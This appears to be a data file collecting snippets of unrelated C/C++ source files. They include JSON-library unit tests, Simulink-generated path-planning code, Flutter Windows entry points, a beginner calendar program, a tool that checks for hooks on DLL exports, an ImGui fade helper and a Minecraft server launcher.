REQUIRE(doc[0] >= doc[1]);\n    REQUIRE_FALSE(doc[0] != doc[1]);\n    REQUIRE_FALSE(doc[0] < doc[1]);\n    REQUIRE_FALSE(doc[0] > doc[1]);\n  }\n\n  SECTION(\"1 vs 2\") {\n    doc.add(1);\n    doc.add(2);\n\n    REQUIRE(doc[0] != doc[1]);\n    REQUIRE(doc[0] < doc[1]);\n    REQUIRE(doc[0] <= doc[1]);\n    REQUIRE_FALSE(doc[0] == doc[1]);\n    REQUIRE_FALSE(doc[0] > doc[1]);\n    REQUIRE_FALSE(doc[0] >= doc[1]);\n  }\n\n  SECTION(\"'abc' vs 'bcd'\") {\n    doc.add(\"abc\");\n    doc.add(\"bcd\");\n\n    REQUIRE(doc[0] != doc[1]);\n    REQUIRE(doc[0] < doc[1]);\n    REQUIRE(doc[0] <= doc[1]);\n    REQUIRE_FALSE(doc[0] == doc[1]);\n    REQUIRE_FALSE(doc[0] > doc[1]);\n    REQUIRE_FALSE(doc[0] >= doc[1]);\n  }\n}\n\nTEST_CASE(\"ElementProxy::remove()\") {\n  JsonDocument doc;\n  doc.add<JsonVariant>();\n  ElementProxy ep = doc[0];\n\n  SECTION(\"remove(int)\") {\n    ep.add(1);\n    ep.add(2);\n    ep.add(3);\n\n    ep.remove(1);\n\n    REQUIRE(ep.as<std::string>() == \"[1,3]\");\n  }\n\n  SECTION(\"remove(const char *)\") {\n    ep[\"a\"] = 1;\n    ep[\"b\"] = 2;\n\n    ep.remove(\"a\");\n\n    REQUIRE(ep.as<std::string>() == \"{\\\"b\\\":2}\");\n  }\n\n  SECTION(\"remove(std::string)\") {\n    ep[\"a\"] = 1;\n    ep[\"b\"] = 2;\n\n    ep.remove(\"b\"_s);\n\n    REQUIRE(ep.as<std::string>() == \"{\\\"a\\\":1}\");\n  }\n\n#ifdef HAS_VARIABLE_LENGTH_ARRAY\n  SECTION(\"remove(vla)\") {\n    ep[\"a\"] = 1;\n    ep[\"b\"] = 2;\n\n    size_t i = 4;\n    char vla[i];\n    strcpy(vla, \"b\");\n    ep.remove(vla);\n\n    REQUIRE(ep.as<std::string>() == \"{\\\"a\\\":1}\");\n  }\n#endif\n}\n\nTEST_CASE(\"ElementProxy::set()\") {\n  JsonDocument doc;\n  ElementProxy ep = doc[0];\n\n  SECTION(\"set(int)\") {\n    ep.set(42);\n\n    REQUIRE(doc.as<std::string>() == \"[42]\");\n  }\n\n  SECTION(\"set(const char*)\") {\n    ep.set(\"world\");\n\n    REQUIRE(doc.as<std::string>() == \"[\\\"world\\\"]\");\n  }\n\n  SECTION(\"set(char[])\") {\n    char s[] = \"world\";\n    ep.set(s);\n    strcpy(s, \"!!!!!\");\n\n    REQUIRE(doc.as<std::string>() == \"[\\\"world\\\"]\");\n  }\n}\n\nTEST_CASE(\"ElementProxy::size()\") {\n  JsonDocument doc;\n  doc.add<JsonVariant>();\n  ElementProxy ep = doc[0];\n\n  SECTION(\"returns 0\") {\n    REQUIRE(ep.size() == 0);\n  }\n\n  SECTION(\"as an array, returns 2\") {\n    ep.add(1);\n    ep.add(2);\n    REQUIRE(ep.size() == 2);\n  }\n\n  SECTION(\"as an object, returns 2\") {\n    ep[\"a\"] = 1;\n    ep[\"b\"] = 2;\n    REQUIRE(ep.size() == 2);\n  }\n}\n\nTEST_CASE(\"ElementProxy::operator[]\") {\n  JsonDocument doc;\n  ElementProxy ep = doc[1];\n\n  SECTION(\"set member\") {\n    ep[\"world\"] = 42;\n\n    REQUIRE(doc.as<std::string>() == \"[null,{\\\"world\\\":42}]\");\n  }\n\n  SECTION(\"set element\") {\n    ep[2] = 42;\n\n    REQUIRE(doc.as<std::string>() == \"[null,[null,null,42]]\");\n  }\n}\n\nTEST_CASE(\"ElementProxy cast to JsonVariantConst\") {\n  JsonDocument doc;\n  doc[0] = \"world\";\n\n  const ElementProxy ep = doc[0];\n\n  JsonVariantConst var = ep;\n\n  CHECK(var.as<std::string>() == \"world\");\n}\n\nTEST_CASE(\"ElementProxy cast to JsonVariant\") {\n  JsonDocument doc;\n  doc[0] = \"world\";\n\n  ElementProxy ep = doc[0];\n\n  JsonVariant var = ep;\n\n  CHECK(var.as<std::string>() == \"world\");\n\n  var.set(\"toto\");\n\n  CHECK(doc.as<std::string>() == \"[\\\"toto\\\"]\");\n}\n",
    "//\n// Academic License - for use in teaching, academic research, and meeting\n// course requirements at degree granting institutions only.  Not for\n// government, commercial, or other organizational use.\n//\n// File: APF_Path_Planning_2023a_BlueIsBlack.cpp\n//\n// Code generated for Simulink model 'APF_Path_Planning_2023a_BlueIsBlack'.\n//\n// Model version                  : 1.1017\n// Simulink Coder version         : 9.9 (R2023a) 19-Nov-2022\n// C/C++ source code generated on : Mon Apr  1 17:55:30 2024\n//\n// Target selection: ert.tlc\n// Embedded hardware selection: ARM Compatible->ARM 64-bit (LP64)\n// Code generation objectives: Unspecified\n// Validation result: Not run\n//\n#include \"APF_Path_Planning_2023a_BlueIsBlack.h\"\n#include \"rtwtypes.h\"\n#include \"APF_Path_Planning_2023a_BlueIsBlack_private.h\"\n#include <math.h>\n\nextern \"C\"\n{\n\n#include \"rt_nonfinite.h\"\n\n}\n\n#include \"rt_defines.h\"\n#include <string.h>\n\n// Block signals (default storage)\nB_APF_Path_Planning_2023a_Blu_T APF_Path_Planning_2023a_BlueI_B;\n\n// Block states (default storage)\nDW_APF_Path_Planning_2023a_Bl_T APF_Path_Planning_2023a_Blue_DW;\n\n// Real-time model\nRT_MODEL_APF_Path_Planning_20_T APF_Path_Planning_2023a_Blue_M_ =\n  RT_MODEL_APF_Path_Planning_20_T();\nRT_MODEL_APF_Path_Planning_20_T *const APF_Path_Planning_2023a_Blue_M =\n  &APF_Path_Planning_2023a_Blue_M_;\n\n// Forward declaration for local functions\nstatic real_T APF_Path_Planning_2023a_maximum(const real_T x[8]);\n\n// Forward declaration for local functions\nstatic real_T APF_Path_Planning_202_maximum_p(const real_T x[8]);\n\n// Forward declaration for local functions\nstatic void APF_Path_Planning_2023a_xzlascl(real_T cfrom, real_T cto, real_T A\n  [36]);\nstatic real_T APF_Path_Planning_2023a_xnrm2_m(int32_T n, const real_T x[36],\n  int32_T ix0);\nstatic real_T APF_Path_Planning_rt_hypotd_snf(real_T u0, real_T u1);\nstatic real_T APF_Path_Planning_2023a_xzlarfg(int32_T n, real_T *alpha1, real_T\n  x[36], int32_T ix0);\nstatic void APF_Path_Planning_2023a_xzgehrd(real_T a[36], int32_T ilo, int32_T\n  ihi);\nstatic real_T APF_Path_Planning_2023_xnrm2_mw(int32_T n, const real_T x[3]);\nstatic void APF_Path_Planning_2023a_xdlanv2(real_T *a, real_T *b, real_T *c,\n  real_T *d, real_T *rt1r, real_T *rt1i, real_T *rt2r, real_T *rt2i, real_T *cs,\n  real_T *sn);\nstatic void APF_Path_Planning_2023a_xdlahqr(int32_T ilo, int32_T ihi, real_T h\n  [36], int32_T *info, real_T *z, real_T wr[6], real_T wi[6]);\nstatic void APF_Path_Planning_202_xzlascl_f(real_T cfrom, real_T cto, int32_T\n  b_m, real_T A[6], int32_T iA0);\nstatic void APF_Path_Planning_2_eigStandard(const real_T A[36], creal_T V[6]);\nstatic void APF_Path_Planning_20_xzlascl_fe(real_T cfrom, real_T cto, int32_T\n  b_m, real_T A[5], int32_T iA0);\nstatic void APF_Path_Planning_2023a_xdlaev2(real_T a, real_T b, real_T c, real_T\n  *rt1, real_T *rt2);\nstatic void APF_Path_Planning_insertionsort(real_T x[6], int32_T xstart, int32_T\n  xend);\nstatic int32_T APF_Path_Planning_2023a_xdsterf(real_T d[6], real_T e[5]);\nstatic void APF_Path_Planning_2023a_Blu_eig(const real_T A[36], creal_T V[6]);\nstatic void APF_Path_Plann_binary_expand_op(real_T in1_data[], int32_T in1_size\n  [2], const real_T in2[36], int32_T in3, int32_T in4);\nstatic real_T APF_Path_Planning_rt_atan2d_snf(real_T u0, real_T u1);\nstatic real_T APF_Path_Planning_2_rt_powd_snf(real_T u0, real_T u1);\nstatic real_T APF__rt_urand_Upu32_Yd_f_pw_snf(uint32_T *u);\nstatic real_T APF__rt_nrand_Upu32_Yd_f_pw_snf(uint32_T *u);\nstatic real_T APF_Path_Planning_2023a_B_xnrm2(int32_T n, const real_T x[36],\n  int32_T ix0);\nstatic real_T APF_Path_Planning_2023a_B_xdotc(int32_T n, const real_T x[36],\n  int32_T ix0, const real_T y[36], int32_T iy0);\nstatic void APF_Path_Planning_2023a_B_xaxpy(int32_T n, real_T a, int32_T ix0,\n  real_T y[36], int32_T iy0);\nstatic real_T APF_Path_Planning_2023a_xnrm2_c(int32_T n, const real_T x[6],\n  int32_T ix0);\nstatic void APF_Path_Planning_2023a_xaxpy_j(int32_T n, real_T a, const real_T x\n  [36], int32_T ix0, real_T y[6], int32_T iy0);\nstatic void APF_Path_Planning_2023_xaxpy_jv(int32_T n, real_T a, const real_T x\n  [6], int32_T ix0, real_T y[36], int32_T iy0);\nstatic void APF_Path_Planning_2023a_B_xswap(real_T x[36], int32_T ix0, int32_T\n  iy0);\nstatic void APF_Path_Planning_2023a_B_xrotg(real_T *a, real_T *b, real_T *c,\n  real_T *s);\nstatic void APF_Path_Planning_2023a_Bl_xrot(real_T x[36], int32_T ix0, int32_T\n  iy0, real_T c, real_T s);\nstatic void APF_Path_Planning_2023a_Blu_svd(const real_T A[36], real_T U[36],\n  real_T s[6], real_T V[36]);\nstatic void APF_Path_Plannin_rt_invd3x3_snf(const real_T u[9], real_T y[9]);\nint32_T div_nde_s32_floor(int32_T numerator, int32_T denominator)\n{\n  return (((numerator < 0) != (denominator < 0)) && (numerator % denominator !=\n           0) ? -1 : 0) + numerator / denominator;\n}\n\n//\n// System initialize for action system:\n//    '<S1>/Change BLACK Behavior'\n//    '<S1>/Change BLUE Behavior'\n//\nvoid APF_Pa_ChangeBLACKBehavior_Init(RT_MODEL_APF_Path_P",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_application_1\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\r\nusing namespace std;\r\n\r\nvoid calender()\r\n{\r\n    int daysOfYear = 365;\r\n    int monthOfYear = 12;\r\n    string nameOfMonth[12] = {\"January\", \"Fabruary\", \"March\", \"April\", \"May\", \"June\", \"July\", \"August\", \"September\", \"October\", \"November\", \"December\"};\r\n    int dayPerMonth[12] = {31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31}; // Fixed array size\r\n    int weekOfYear = 52;\r\n    int daysOfWeek = 7;\r\n    string dayPerWeek[daysOfWeek] = {\"Monday\", \"Tuesday\", \"Wednesday\", \"Thursday\", \"Friday\", \"Saturday\", \"Sunday\"};\r\n\r\n    for(int i = 0; i < daysOfWeek; i++)\r\n    {\r\n        cout << dayPerWeek[i] << \"|\";\r\n    }\r\n    cout << endl << endl;\r\n\r\n    for(int i = 0; i < monthOfYear; i++)\r\n    { \r\n            cout <<nameOfMonth[i] <<endl << endl;\r\n        for(int j = 1; j <= dayPerMonth[i]; j++)\r\n        {\r\n            for(int k = 0; k < daysOfWeek; k++)\r\n            {\r\n                if (j <= dayPerMonth[i])\r\n                {\r\n                    cout << j << \"\\t\\t \";\r\n                    j++;\r\n                }\r\n            }\r\n            j--; \r\n            cout << endl;\r\n        }\r\n    }\r\n}\r\n\r\nint main()\r\n{\r\n    calender();\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"weather_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <Windows.h>\n\n#include <tchar.h>\n#include <iostream>\n#include <print>\n#include <vector>\n\n#include <TlHelp32.h>\n\nHANDLE GetProcessHandle(const wchar_t* ProcessName) {\n    DWORD PIDWithHighestThreadCount = 0;\n    DWORD HighestThreadCount = 0;\n\n    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n    if (hSnap == INVALID_HANDLE_VALUE) {\n        return NULL;\n    }\n\n    PROCESSENTRY32 pe;\n    pe.dwSize = sizeof(PROCESSENTRY32);\n\n    while (Process32Next(hSnap, &pe))\n    {\n        if ((_tcsicmp(pe.szExeFile, ProcessName) == 0) && (pe.cntThreads > HighestThreadCount))\n        {\n            HighestThreadCount = pe.cntThreads;\n            PIDWithHighestThreadCount = pe.th32ProcessID;\n        }\n    }\n\n    CloseHandle(hSnap);\n\n    if (PIDWithHighestThreadCount != 0) {\n        return OpenProcess(PROCESS_ALL_ACCESS, FALSE, PIDWithHighestThreadCount);\n    }\n    else {\n        // No process found.\n        return NULL;\n    }\n}\n\nbool CheckHooked(HANDLE ProcessHandle, const char* ModuleName, const char* ExportName) {\n    // We will check the first 25 bytes here, why bother more?\n    // Ghetto code incoming.\n\n    HMODULE ModuleHandle = GetModuleHandleA(ModuleName);\n\n    if (!ModuleHandle) { // if we get there, idk how we failed so bad.\n        std::println(\"GetModuleHandleA Failed for {}. Error Code: 0x{:X}\", ModuleName, GetLastError());\n        return false;\n    }\n\n    void* FuncAddress = (void*)GetProcAddress(ModuleHandle, ExportName);\n\n    if (!FuncAddress) {\n        std::println(\"GetProcAddress Failed for {} ( Export Name: {} ). Error Code: 0x{:X}\", ModuleName, ExportName, GetLastError());\n        return false;\n    }\n\n    std::vector<BYTE> Buffer(25);\n    if (!ReadProcessMemory(ProcessHandle, FuncAddress, Buffer.data(), Buffer.size(), nullptr)) {\n        if (GetLastError() == 0x12B) { // Happens when the module simply isn't loaded. Enumerating is simply bloat when the error code can be simply checked.\n            return true;\n        }\n        else {\n            std::println(\"ReadProcessMemory Failed for {} ( Export Name: {} Address: 0x{:X} ). Error Code: 0x{:X}\", ModuleName, ExportName, (uintptr_t)FuncAddress, GetLastError());\n            return false;\n        }\n    }\n\n    std::vector<BYTE> CurrentProcessBuffer(25);\n    memcpy(CurrentProcessBuffer.data(), FuncAddress, CurrentProcessBuffer.size());\n\n    if (memcmp(Buffer.data(), CurrentProcessBuffer.data(), 25) != 0) {\n        if (Buffer[0] != 0xE9 && Buffer[0] == CurrentProcessBuffer[0] || strcmp(ExportName, \"KiUserInvertedFunctionTable\") == 0) { // first check is jmp second is first byte match\n            std::println(\"{} ( 0x{:X} ) in {} is hooked (Possible false flag)\", ExportName, (uintptr_t)FuncAddress, ModuleName);\n        }\n        else {\n            std::println(\"{} ( 0x{:X} ) in {} is hooked\", ExportName, (uintptr_t)FuncAddress, ModuleName);\n        }\n\n        std::print(\"Process Bytes: \");\n\n        for (int i = 0; i < Buffer.size(); i++) {\n            if (Buffer[i] < 0x10) {\n                std::print(\"0{:X} \", Buffer[i]);\n            }\n            else {\n                std::print(\"{:X} \", Buffer[i]);\n            }\n        }\n\n        std::println(\"\");\n\n        std::print(\"Expected Bytes: \");\n\n        for (int i = 0; i < CurrentProcessBuffer.size(); i++) {\n            if (CurrentProcessBuffer[i] < 0x10) {\n                std::print(\"0{:X} \", CurrentProcessBuffer[i]);\n            }\n            else {\n                std::print(\"{:X} \", CurrentProcessBuffer[i]);\n            }\n        }\n\n        std::print(\"\\n\\n\");\n    }\n\n    return true;\n}\n\nvoid WalkExportsAndCheck(HANDLE ProcessHandle, const char* ModuleName) {\n    HMODULE ModuleHandle = GetModuleHandleA(ModuleName);\n\n    if (!ModuleHandle) {\n        std::println(\"GetModuleHandleA Failed for {}. Error Code: 0x{:X}\", ModuleName, GetLastError());\n        return;\n    }\n\n    if (reinterpret_cast<IMAGE_DOS_HEADER*>(ModuleHandle)->e_magic != IMAGE_DOS_SIGNATURE) {\n        std::println(\"Invalid DOS Signature of {}\", ModuleName);\n        return;\n    }\n\n    IMAGE_NT_HEADERS* Header = (IMAGE_NT_HEADERS*)((uintptr_t)ModuleHandle + ((IMAGE_DOS_HEADER*)ModuleHandle)->e_lfanew);\n\n    if (Header->Signature != IMAGE_NT_SIGNATURE) {\n        std::println(\"Invalid NT Signature of {}\", ModuleName);\n        return;\n    }\n\n    if (Header->OptionalHeader.NumberOfRvaAndSizes < 0) {\n        std::println(\"Number of RVA and Sizes is less than 0 of {}\", ModuleName);\n        return;\n    }\n\n    IMAGE_EXPORT_DIRECTORY* Exports = (IMAGE_EXPORT_DIRECTORY*)((uintptr_t)ModuleHandle + Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n\n    if (Exports->AddressOfNames != 0) {\n        DWORD* Names = (DWORD*)((uintptr_t)ModuleHandle + Exports->AddressOfNames);\n        for (int i = 0; i < Exports->NumberOfNames; i++) {\n            if (!CheckHooked(ProcessHandle, ModuleName, reinterpret_cast<const char*>(ModuleHandle) + Names[i])) {\n                std::println(\"CheckHooked failed on {}\", ModuleNa",
    "/***************************************************************************************\r\n *    imgui_fade_in_out.cpp is a file frome miniDart project\r\n *    Author : Eric Bachard  / monday april 1st 2020, 20:5133:03 (UTC+0200)\r\n *    eric.bachard@free.fr\r\n *\r\n *    2018 december 30th\r\n *\r\n *    See : https://github.com/ocornut/imgui/issues/1925 as example of use\r\n *\r\n *                                  MIT License\r\n *                                  -----------\r\n *                               eric.bachard@free.fr\r\n *\r\n * Permission is hereby granted, free of charge, to any person obtaining a copy\r\n * of this software and associated documentation files (the \"Software\"), to deal\r\n * in the Software without restriction, including without limitation the rights\r\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\r\n * copies of the Software, and to permit persons to whom the Software is\r\n * furnished to do so, subject to the following conditions:\r\n *\r\n * The above copyright notice and this permission notice shall be included in all\r\n * copies or substantial portions of the Software.\r\n *\r\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\r\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\r\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\r\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\r\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\r\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\r\n * SOFTWARE.\r\n *\r\n * **************************************************************************************/\r\n\r\n\r\n#include \"fadeinout.hpp\"\r\n\r\nmd::FadeInOut::FadeInOut()\r\n{\r\n}\r\n\r\nmd::FadeInOut::~FadeInOut()\r\n{\r\n}\r\n\r\nvoid md::FadeInOut::init()\r\n{\r\n    ImGuiIO& io = ImGui::GetIO();\r\n    (void)io; // makes the compiler happy\r\n}\r\n\r\n// TODO : buttons \r\n\r\nfloat md::FadeInOut::heartBeat(float up_duration, float down_duration, float min_hb, float max_hb, bool b_inside_window_hb)\r\n{\r\n    static float opacity_hb = 1.0f;\r\n    set_range(min_hb, max_hb);\r\n\r\n    up_hb_step = calculate_step(get_range(), up_duration);\r\n    down_hb_step = calculate_step(get_range(), down_duration);\r\n\r\n    if (b_inside_window_hb)\r\n    {\r\n        opacity_hb = max_hb;\r\n    }\r\n    else if (up_hb_action == true)\r\n    {\r\n        opacity_hb += up_hb_step;\r\n\r\n        if (opacity_hb >= max_hb)\r\n        {\r\n            opacity_hb = max_hb;\r\n            up_hb_action = false;\r\n        }\r\n    }\r\n    else\r\n    {\r\n        opacity_hb -= down_hb_step;\r\n\r\n        if (opacity_hb <= min_hb)\r\n        {\r\n            opacity_hb = min_hb;\r\n            up_hb_action = true;\r\n        }\r\n    }\r\n\r\n    return sin(opacity_hb);\r\n}\r\n\r\nfloat md::FadeInOut::fadeInOut(float up_duration, float down_duration, float min, float max, bool b_inside_window)\r\n{\r\n    static float opacity = 1.0f;\r\n\r\n    if (!b_inside_window)\r\n    {\r\n        opacity -= calculate_step((max - min), down_duration);\r\n\r\n        if (opacity < min)\r\n            opacity = min;\r\n    }\r\n    else\r\n    {\r\n        opacity += calculate_step((max - min), up_duration);\r\n\r\n        if (opacity > max)\r\n            opacity = max;\r\n    }\r\n    return opacity;\r\n}\r\n\r\n\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"country_list_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <log.h>\n#include <dlfcn.h>\n#include <argparser.h>\n#include <mcpelauncher/minecraft_utils.h>\n#include <mcpelauncher/minecraft_version.h>\n#include <mcpelauncher/crash_handler.h>\n#include <mcpelauncher/path_helper.h>\n#include <mcpelauncher/mod_loader.h>\n#include <mcpelauncher/patch_utils.h>\n#include <libc_shim.h>\n#include <mcpelauncher/linker.h>\n#include <minecraft/imported/android_symbols.h>\n#include \"stubs.h\"\n#include <FileUtil.h>\n#include <properties/property.h>\n#include <fstream>\n#include <signal.h>\n#include <unistd.h>\n#include <sys/sysinfo.h>\n#include <sys/mman.h>\n#include <bitset>\n#include <memory.h>\n#include <memory>\n#include <random>\n#include \"main.h\"\n#include \"console_reader.h\"\n\n\nvoid printVersionInfo();\n\nint main(int argc, char* argv[]) {\n\tCrashHandler::registerCrashHandler();\n\tMinecraftUtils::workaroundLocaleBug();\n\n\targparser::arg_parser p;\n\targparser::arg<bool> printVersion(p, \"--version\", \"-v\", \"Prints version info\");\n\targparser::arg<std::string> propertiesFileArg(p, \"--properties\", \"-p\", \"server.properties file\");\n\n\tstd::string propertiesFilePath=\"server.properties\";\n\n\tif(!p.parse(argc, (const char**)argv))\n\t\treturn 1;\n\tif(printVersion) {\n\t\tprintVersionInfo();\n\t\treturn 0;\n\t}\n\n\tif(!propertiesFileArg.get().empty())\n\t\tpropertiesFilePath=propertiesFileArg;\n\n\tLog::info(\"Launcher\", \"Version: arm64-server\");\n\tLog::info(\"Launcher\", \"Loader server.properties\");\n\tstd::ifstream propertiesFile(propertiesFilePath);\n\tif(!propertiesFile) {\n\t\tLog::error(\"Launcher\", \"Unable to read properties file: %s\", propertiesFilePath.c_str());\n\t\treturn 2;\n\t}\n\tproperties::property_list prop;\n\tprop.load(propertiesFile);\n\n\tLog::trace(\"Launcher\", \"Loading android libraries\");\n\tlinker::init();\n\tLog::trace(\"Launcher\", \"linker loaded\");\n\n\tproperties::property<std::string> game_dir(prop, \"game-directory\", \"game\");\n\tproperties::property<std::string> data_dir(prop, \"data-directory\", \"data\");\n\tPathHelper::setGameDir(game_dir);\n\tLog::info(\"Launcher\", \"Game directory: %s\", game_dir.get().c_str());\n\tLog::info(\"Launcher\", \"Data directory: %s\", data_dir.get().c_str());\n\n\t// Fix saving to internal storage without write access to /data/*\n\t// TODO research how this path is constructed\n\tauto pid = getpid();\n\tshim::rewrite_filesystem_access = {\n\t\t{\"worlds\", data_dir.get()+\"/worlds/\"},\n\t\t{\"permissions.json\", data_dir.get()+\"/permissions.json\"},\n\t\t{\"data\", data_dir.get()+\"/\"},\n\t\t{\"treatments\", data_dir.get()+\"/treatments/\"},\n\t\t{\"minecraftpe\", data_dir.get()+\"/minecraftpe/\"},\n\t\t{\"premium_cache\", data_dir.get()+\"/premium_cache/\"},\n\t\t{\".\", PathHelper::getGameDir()+\"assets/\"}\n\t};\n\tfor(auto&& redir : shim::rewrite_filesystem_access) {\n\t\tLog::trace(\"REDIRECT\", \"%s to %s\", redir.first.data(), redir.second.data());\n\t}\n\tauto libC = MinecraftUtils::getLibCSymbols();\n\tlinker::load_library(\"libc.so\", libC);\n\tMinecraftUtils::loadLibM();\n\tMinecraftUtils::setupHybris();\n\ttry {\n\t\tPathHelper::findGameFile(std::string(\"lib/\") + MinecraftUtils::getLibraryAbi() + \"/libminecraftpe.so\");\n\t} catch(std::exception& e) {\n\t\tLog::error(\"Launcher\", \"Could not find the game, use the game-directory property to fix this error. Original Error: %s\", e.what());\n\t\treturn 1;\n\t}\n\tlinker::update_LD_LIBRARY_PATH(PathHelper::findGameFile(std::string(\"lib/\") + MinecraftUtils::getLibraryAbi()).data());\n\t/*if(!disableFmod) {\n\t\ttry {\n\t\t\tMinecraftUtils::loadFMod();\n\t\t} catch(std::exception& e) {\n\t\t\tLog::warn(\"FMOD\", \"Failed to load host libfmod: '%s', use experimental pulseaudio backend if available\", e.what());\n\t\t}\n\t}*/\n\n\tstd::unordered_map<std::string, void*> android_syms;\n\tStubs::initHybrisHooks(android_syms);\n\tfor(auto s = android_symbols; *s; s++)  // stub missing symbols\n\t\tandroid_syms.insert({*s, (void*)+[]() { Log::warn(\"Main\", \"Android stub called\"); }});\n\tlinker::load_library(\"libandroid.so\", android_syms);\n\tModLoader modLoader;\n\tmodLoader.loadModsFromDirectory(PathHelper::getPrimaryDataDirectory() + \"mods/\", true);\n\tlinker::load_library(\"libGLESv2.so\", {});\n\tlinker::load_library(\"libEGL.so\", {});\n\n\tLog::trace(\"Launcher\", \"Loading Minecraft library\");\n\tstatic void* handle = MinecraftUtils::loadMinecraftLib();\n\tif(!handle) {\n\t\tLog::error(\"Launcher\", \"Failed to load Minecraft library\");\n\t\treturn 51;\n\t}\n\tLog::info(\"Launcher\", \"Loaded Minecraft library\");\n\tLog::debug(\"Launcher\", \"Minecraft is at offset %p\", (void*)MinecraftUtils::getLibraryBase(handle));\n\tbase = MinecraftUtils::getLibraryBase(handle);\n\tif(*(uint64_t*)(base+0x38B4309)!=0x1b011e7c0100527aL) {\n\t\tLog::error(\"Launcher\", \"Incompatible Minecraft version, only v1.21.2.02 is supported.\");\n\t\treturn 52;\n\t}\n\n\tmodLoader.loadModsFromDirectory(PathHelper::getPrimaryDataDirectory() + \"mods/\");\n\n\tLog::info(\"Launcher\", \"Game version: v1.21.2.02\");\n\n\t//Log::info(\"Launcher\", \"SERVER!\");\n\tLog::debug(\"Launcher\", \"Creating ContentLog\");\n\tContentLog *contentLog=new ContentLog;\n\tLog::debug(\"Launcher\", \"Creating AppConfigs\");\n\tstd::unique_ptr<AppConfigs> appConfigs=AppConfigsFactory::createAppConfigs();\n\t((ServiceReference(*)(ContentLo",
